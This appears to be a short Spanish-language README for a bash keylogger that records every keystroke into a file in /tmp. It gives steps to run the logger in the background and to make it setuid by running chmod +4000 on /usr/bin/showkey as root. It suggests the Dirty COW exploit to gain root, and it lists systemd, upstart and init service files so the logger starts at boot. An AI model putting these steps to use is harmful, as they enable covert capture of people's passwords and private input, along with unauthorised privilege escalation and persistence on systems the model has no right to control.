# bash_keylogger
keylogger en bash se puede ejecutar en background para el testing antes de meterlo como servicio del sistema.
Para ello ejecuta en una shell: 

./keylogger_bash & 

si te saliese este error en la consola: "No se puede conseguir un descriptor de archivo referido a la consola"
tendras q dar permisos "s" al ejecutable del showkey como root, asi: 
(para conseguir una escalada de privilegios a root usa el exploit para Dirty Cow)

chmod +4000 /usr/bin/showkey 


el fichero que intercepta todo lo pulsado se genera en /tmp con nombre "teclas-..."

Puedes hacer q funcione como un servicio en el arranque:

    -fichero de configuracion del servicio para SYSTEMD:  keylogger.service
    -fichero de configuracion del servicio para UPSTART:  keylogger.conf
    -fichero de configuracion del sercicion para el antiguo INIT: keylogger_service_init.sh
    

